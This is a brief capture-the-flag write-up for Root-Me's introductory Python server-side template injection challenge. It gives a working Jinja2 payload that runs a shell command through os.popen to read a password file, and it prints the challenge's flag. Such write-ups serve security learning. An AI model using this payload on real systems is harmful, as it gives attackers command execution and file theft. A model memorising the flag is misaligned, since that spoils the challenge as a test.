# [Python - Server-side Template Injection Introduction](https://www.root-me.org/en/Challenges/Web-Server/Python-Server-side-Template-Injection-Introduction)

## Solutions

- Jinja2 is one of the most used template engines for Python
- Find payload for Jinja2 template injection: <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#exploit-the-ssti-by-calling-ospopenread>

- Payload:

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat .passwd').read() }}
```

- => Flag: `Python_SST1_1s_co0l_4nd_mY_p4yl04ds_4r3_1ns4n3!!!`

## References

- <https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/>
- <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md>
